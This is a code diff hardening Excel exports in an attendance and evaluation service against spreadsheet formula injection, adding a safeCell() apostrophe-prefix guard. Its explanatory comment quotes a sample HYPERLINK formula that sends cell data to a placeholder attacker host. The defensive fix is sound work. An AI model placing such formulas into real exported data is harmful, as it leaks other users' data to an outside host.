@@ -22,6 +22,31 @@ const STATUS_TEXT = {
   EL: 'Có phép',
 };
 
+// ──────────────────────────────────────────────────────────
+// CSV / XLSX formula injection guard (audit PR 4 — SEC-004)
+// ──────────────────────────────────────────────────────────
+// Spreadsheet apps (Excel, LibreOffice, Google Sheets when downloading)
+// evaluate cells whose value STARTS with `= + - @ \t \r` as a formula.
+// A user-controlled field like
+//   name = '=HYPERLINK("http://attacker.tld/x?u="&A2,"Click")'
+// is harmless in the web UI but auto-executes when an HR admin opens
+// the exported .xlsx on Windows. WEBSERVICE() / external lookup gives
+// the attacker outbound traffic + cookie exfil.
+//
+// Defence: prepend a single apostrophe so Excel treats the value as a
+// literal string. The apostrophe itself is not displayed but is preserved
+// on round-trip. Apply to EVERY user-controlled string that lands in a
+// cell: name, department, teacherComment, remark, classCode, courseName,
+// teamName, level, empCode, status text.
+//
+// Numbers and dates pass through untouched.
+// ──────────────────────────────────────────────────────────
+const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
+const safeCell = (value) => {
+  if (typeof value !== 'string') return value;
+  return FORMULA_TRIGGER.test(value) ? `'${value}` : value;
+};
+
 /**
  * Build the aggregation pipeline to join Attendance with
  * User, Schedule, Class, and Team.
@@ -173,21 +198,23 @@ const generateExcel = async (records) => {
     const startDate = new Date(r.startTime);
     const endDate = new Date(r.endTime);
 
+    // SEC-004: every user-controllable string passes through safeCell()
+    // to neutralise spreadsheet formula injection.
     sheet.addRow({
-      empCode: r.empCode,
-      userName: r.userName,
-      department: r.department || '',
-      userRole: r.userRole,
-      classCode: r.classCode,
-      courseName: r.courseName,
-      teamName: r.teamName,
+      empCode: safeCell(r.empCode),
+      userName: safeCell(r.userName),
+      department: safeCell(r.department || ''),
+      userRole: safeCell(r.userRole),
+      classCode: safeCell(r.classCode),
+      courseName: safeCell(r.courseName),
+      teamName: safeCell(r.teamName),
       dateStr: toVN(startDate).format('DD/MM/YYYY'),
       startStr: toVN(startDate).format('HH:mm'),
       endStr: toVN(endDate).format('HH:mm'),
       duration: Math.round(r.durationMinutes),
-      statusText: STATUS_TEXT[r.status] || r.status,
+      statusText: safeCell(STATUS_TEXT[r.status] || r.status),
       status: r.status,
-      remark: r.remark || '',
+      remark: safeCell(r.remark || ''),
       attendanceDate: toVN(r.attendanceDate).format('DD/MM/YYYY HH:mm'),
     });
   }
@@ -458,19 +485,21 @@ const generateEvaluationExcel = async (records) => {
   headerRow.height = 24;
 
   for (const r of records) {
+    // SEC-004: every user-controllable string passes through safeCell()
+    // to neutralise spreadsheet formula injection.
     sheet.addRow({
-      empCode:            r.empCode,
-      userName:           r.userName,
-      department:         r.department || '',
-      classCode:          r.classCode,
-      courseName:         r.courseName,
-      level:              r.level || '',
+      empCode:            safeCell(r.empCode),
+      userName:           safeCell(r.userName),
+      department:         safeCell(r.department || ''),
+      classCode:          safeCell(r.classCode),
+      courseName:         safeCell(r.courseName),
+      level:              safeCell(r.level || ''),
       grammarScore:       r.grammarScore,
       vocabularyScore:    r.vocabularyScore,
       pronunciationScore: r.pronunciationScore,
       fluencyScore:       r.fluencyScore,
       averageScore:       Math.round(r.averageScore * 100) / 100,
-      teacherComment:     r.teacherComment || '',
+      teacherComment:     safeCell(r.teacherComment || ''),
       updatedStr:         toVN(r.updatedAt).format('DD/MM/YYYY HH:mm'),
     });
   }
@@ -505,4 +534,6 @@ module.exports = {
   getExportStats,
   queryExportData,
   queryEvaluationData,
+  // Exported for unit tests (SEC-004 formula-injection guard)
+  safeCell,
 };
